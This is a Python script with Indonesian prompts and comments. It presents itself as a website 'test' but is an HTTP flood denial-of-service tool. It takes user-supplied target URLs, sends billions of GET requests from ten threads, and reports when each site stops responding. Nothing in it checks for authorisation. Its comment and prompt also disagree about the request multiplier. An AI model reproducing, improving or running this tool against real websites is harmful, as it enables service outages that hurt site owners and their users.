import requests
import threading
import time
from datetime import datetime

# Konfigurasi
TARGET_URLS = []
while True:
    url = input("Masukkan alamat website yang akan diuji (atau kosongkan untuk selesai): ")
    if not url:
        break
    TARGET_URLS.append(url)

if not TARGET_URLS:
    print("Tidak ada target URL yang dimasukkan. Program berhenti.")
    exit()

MULTIPLIER = int(input("Masukkan kelipatan pengiriman (dalam miliar, contoh: 2 untuk 2.000.000.000): "))
BASE_UNIT = 10000000000  # 10 miliar
NUM_REQUESTS = BASE_UNIT * MULTIPLIER  # Total permintaan
THREAD_COUNT = 10  # Jumlah thread untuk paralelisme
REQUESTS_PER_THREAD = NUM_REQUESTS // THREAD_COUNT

# Variabel untuk melacak status
success_count = 0
failure_count = 0
start_time = None

def send_requests(thread_id):
    global success_count, failure_count, start_time
    
    if thread_id == 0:
        start_time = time.time()
    
    for i in range(REQUESTS_PER_THREAD):
        for target_url in TARGET_URLS:
            try:
                response = requests.get(target_url, timeout=5)
                if response.status_code == 200:
                    success_count += 1
                    print(f"[Thread {thread_id}] Packet {i+1}/{REQUESTS_PER_THREAD} berhasil ke {target_url} - Status: {response.status_code}")
                else:
                    failure_count += 1
                    print(f"[Thread {thread_id}] Packet {i+1}/{REQUESTS_PER_THREAD} gagal ke {target_url} - Status: {response.status_code}")
                
                # Cek jika website down
                if response.status_code >= 400:
                    print(f"[NOTIFIKASI] Website {target_url} mungkin mengalami masalah pada {datetime.now()}")
            
            except requests.exceptions.RequestException as e:
                failure_count += 1
                print(f"[Thread {thread_id}] Packet {i+1}/{REQUESTS_PER_THREAD} gagal ke {target_url} - Error: {str(e)}")
                print(f"[NOTIFIKASI] Website {target_url} tidak dapat diakses pada {datetime.now()}")

def main():
    print(f"\nMulai pengujian ke {len(TARGET_URLS)} target URL:")
    for url in TARGET_URLS:
        print(f"- {url}")
    print(f"Total packets yang akan dikirim: {NUM_REQUESTS:,} ({MULTIPLIER} miliar)")
    
    # Membuat dan memulai threads
    threads = []
    for i in range(THREAD_COUNT):
        thread = threading.Thread(target=send_requests, args=(i,))
        threads.append(thread)
        thread.start()
    
    # Menunggu semua threads selesai
    for thread in threads:
        thread.join()
    
    # Ringkasan hasil
    end_time = time.time()
    duration = end_time - start_time
    
    print("\n=== Ringkasan Pengujian ===")
    print(f"Jumlah target URL: {len(TARGET_URLS)}")
    for url in TARGET_URLS:
        print(f"- {url}")
    print(f"Kelipatan pengiriman: {MULTIPLIER} miliar")
    print(f"Waktu mulai: {datetime.fromtimestamp(start_time)}")
    print(f"Waktu selesai: {datetime.fromtimestamp(end_time)}")
    print(f"Durasi: {duration:.2f} detik")
    print(f"Total packets dikirim: {NUM_REQUESTS:,}")
    print(f"Packet berhasil: {success_count:,}")
    print(f"Packet gagal: {failure_count:,}")
    print(f"Persentase keberhasilan: {(success_count/NUM_REQUESTS)*100:.2f}%")

if __name__ == "__main__":
    main()